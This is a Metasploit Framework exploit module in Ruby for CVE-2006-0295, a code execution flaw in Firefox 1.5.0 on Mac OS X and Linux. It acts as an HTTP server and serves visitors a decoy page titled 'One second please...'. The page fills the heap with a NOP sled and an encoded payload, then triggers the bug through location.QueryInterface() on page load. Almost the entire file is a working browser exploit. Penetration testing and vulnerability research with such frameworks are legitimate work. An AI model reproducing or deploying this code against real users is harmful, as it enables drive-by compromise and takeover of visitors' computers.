##
# $Id: firefox_queryinterface.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	#
	# This module acts as an HTTP server
	#
	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Firefox location.QueryInterface() Code Execution',
			'Description'    => %q{
					This module exploits a code execution vulnerability in the Mozilla
				Firefox browser. To reliably exploit this vulnerability, we need to fill
				almost a gigabyte of memory with our nop sled and payload. This module has
				been tested on OS X 10.3 with the stock Firefox 1.5.0 package.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>  ['hdm'],
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					['CVE', '2006-0295'],
					['OSVDB', '22893'],
					['BID', '16476'],
					['URL', 'http://www.mozilla.org/security/announce/mfsa2006-04.html'],
				],
			'Payload'        =>
				{
					'Space'    => 1000 + (rand(256).to_i * 4),
					'BadChars' => "\x00",
				},
			'Targets'        =>
				[
					[ 'Firefox 1.5.0.0 Mac OS X',
						{
							'Platform' => 'osx',
							'Arch' => ARCH_PPC
						}
					],

					[ 'Firefox 1.5.0.0 Linux',
						{
							'Platform' => 'linux',
							'Arch' => ARCH_X86,
						}
					],
				],
			'DisclosureDate' => 'Feb 02 2006'
			))
	end

	def on_request_uri(cli, request)

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")
		send_response_html(cli, generate_html(p), { 'Content-Type' => 'text/html' })
		handler(cli)
	end

	def generate_html(payload)

		enc_code = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
		enc_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(target.arch))

		return <<-EOF
<html>
<head>
<title>One second please...</title>
<script language="javascript">

function BodyOnLoad() {
	h = FillHeap();
	location.QueryInterface(eval("Components.interfaces.nsIClassInfo"));
};

function FillHeap() {
	// Filler
	var m = "";
	var h = "";
	var a = 0;
	
	// Nop sled
	for(a=0; a<(1024*256); a++)
		m += unescape("#{enc_nops}");
		
	// Payload
	m += unescape("#{enc_code}");
	
	// Repeat
	for(a=0; a<1024; a++)
		h += m;
		
	// Return
	return h;
}
</script>
</head>
<body onload="BodyOnLoad()">
</body>
</html>
EOF
	end

end
